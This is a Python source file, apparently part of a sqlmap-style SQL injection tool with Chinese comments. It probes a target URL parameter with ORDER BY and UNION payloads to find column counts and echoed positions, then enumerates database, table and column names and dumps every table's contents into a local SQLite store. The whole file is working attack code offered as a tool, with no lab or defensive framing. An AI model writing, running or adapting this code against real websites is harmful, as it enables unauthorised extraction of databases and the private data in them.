import sys
from lib.core.function.get_info import *
from lib.core.function.payload import *
from lib.database.data_storage import *
from lib.output.output import *
import random

class Injection():
    '''
    不进行注入检测，假设为带回显的注入
    '''
    database = None
    page_info = None
    url = ''
    payload = None
    _probe_num = 0 # 探测当前表名的列数
    _serial_num = 0 # 探测第几号有信息回显
    _magic_str = '' # 魔力字符串
    _url_ready = '' # 预处理url

    def __init__(self, url, arguments ,pre_payload=''):
        self._magic_str = "$$$$$$$$$$$$$$$$$"
        _url = url.split('//')[1].split('/')[0].split(':')[0]
        self.database = Data(F"{_url}.sqlite")
        self.url = url
        self.page_info = PageInfo(url)
        self.payload = Payload(pre_payload)
        self.output = Output()
        self.arguments = arguments


    def exec_payload(self, location, level, database='', table='', columns=[]):
        '''
        执行,将得到的数据放入数据库
        Args:
            location : 注入点位置()
            level: 所需要得到的数据详细程度
                    1. 库名
                    2. 表名
                    3. 列名
                    4. 库内容
            databases: str, 表示要查找的库
            table： str, 表示要查找的表
            columns: list, 每一项为str，表示一个键值
        Returns:
            null
        '''
        # url 预处理
        self._url_ready = ''.join(self.url.split('&')[:location])+' ' + self._magic_str
        if location < len(self.url.split('&')):
            self._url_ready =  self._url_ready + '&' + ''.join(self.url.split('&')[1:])
        # 探测当前表名的列数
        self._get_columns_num()
        # 探测页面信息暴露点,序号
        self._get_serial_num()

        if level == 1:
            if database == '':
                self._get_databases()
        if level == 2:
            if table == '':
                self._get_tables([database])
        if level == 3:
            if len(columns) == 0:
                self._get_columns(database, [table])
        if level == 4:
            self._get_data(database, table, columns)
        # self.database.close()

    def _get_columns_num(self):
        '''
        得到当前列的所有列数
        '''
        low = 0
        high = 64
        probe_num = 0
        serial_num = 0
        while low < high-1:
            probe_num = (low+high)//2
            payload = self.payload.order_by(probe_num)
            url_malformation = self._url_ready.replace(self._magic_str, payload)
            serial_num = self.page_info.init_malinfo_location(url_malformation, ['Unknown column '])
            if serial_num > -1:
                # 表示不列存在
                high = probe_num
            else: # 表示列存在
                low = probe_num
        if serial_num > -1:
            probe_num -= 1
        self._probe_num = probe_num


    def _get_databases(self):
        databases = self._analysis_data()
        self.database.add_database(databases)
        self.database.show_databases()

    def _get_tables(self, database=[]):
        databases = []
        if database[0] != '':
            databases = database
        else:
            databases = self.database.get_databases()
        for db in databases:
            tables = self._analysis_data(db)
            self.database.add_tables(db, tables)
            self.database.show_tables(db)

    def _get_columns(self, database='', table=[]):
        '''
        从页面中获得所有列名,并将数据存储
        参数为空获得表示所有
        Args:
            databases: str,表示一个库名
            table： 列表，每一项为str，表示表名
        '''
        if database != '' and len(table) != 0:
            # 单独搜索
            for tb in table:
                columns = self._analysis_data(database, tb)
                self.database.add_column(database, tb, columns)
                self.database.show_columns(database,str(tb))
        else:
            # 全部搜索
            for db in self.database.get_databases():
                for tb in self.database.get_tables(db):
                    columns = self._analysis_data(db, tb)
                    self.database.add_column(db, tb, columns)
                    

    def _get_data(self, database='', table='', columns=[]):
        '''
        获得指定表列数据
        参数任意一项为空表示获得所有数据
        Args:
            database: str 一个库名
            table: str 一个表名
            columns: list 每一项str,表示一个列
        '''
        if len(database) != 0 and len(table) != 0 and len(columns) != 0:
            # 指定搜索
            # 查找到所有数据，每一行以空格相隔, 每行数据以逗号相隔
            data = self._analysis_data(database, table, columns, ' ')
            for data_line in data:
                self.database.add_data(database, table, columns, data_line.split(','))
            # self.database.show_data(database, table, columns)
        else:
            # 搜索所有库的所有表的所有列的所有数据
            for db in self.database.get_databases():
                for tb in self.database.get_tables(db):
                    columns = self.database.get_columns(db, tb)
                    data = self._analysis_data(db, tb, columns)
                    for data_line in data:
                        self.database.add_data(db, tb, columns, data_line.split('`'))

    def _analysis_data(self, database='', table='', columns=[], split_char=','):
        '''
        加载payload，并返回分析结果
        Args:
            databases: str,库名
            table: str, 表名
            columns: list, 所需列的数据
        '''
        payload = self.payload.union_sql(self._probe_num, self._serial_num, database, table, columns)
        url_malformation = self._url_ready.replace(self._magic_str, str(payload))
        if self.arguments.options.show_level:
            self.output.info(url_malformation)
        result = self.page_info.get_info(url_malformation)
        # if result == '':
        #     self.output.error(F"result 结果异常,url: {url_malformation}")
        return result.split(split_char)

    def _get_serial_num(self):
        randnum_list = []
        # 生成随机数字字符串
        i = 0
        while i < self._probe_num:
            randnum_list.append(str(random.randint(100000, 1000000)))
            i += 1
        # 根据随机字符获取payload
        payload = self.payload.order_list(randnum_list)
        url_malformation = self._url_ready.replace(self._magic_str, payload)
        serial_num = self.page_info.init_malinfo_location(url_malformation, randnum_list)
        if serial_num < 0:
            self.output.warning("未能探测成功")
        self._serial_num = serial_num + 1




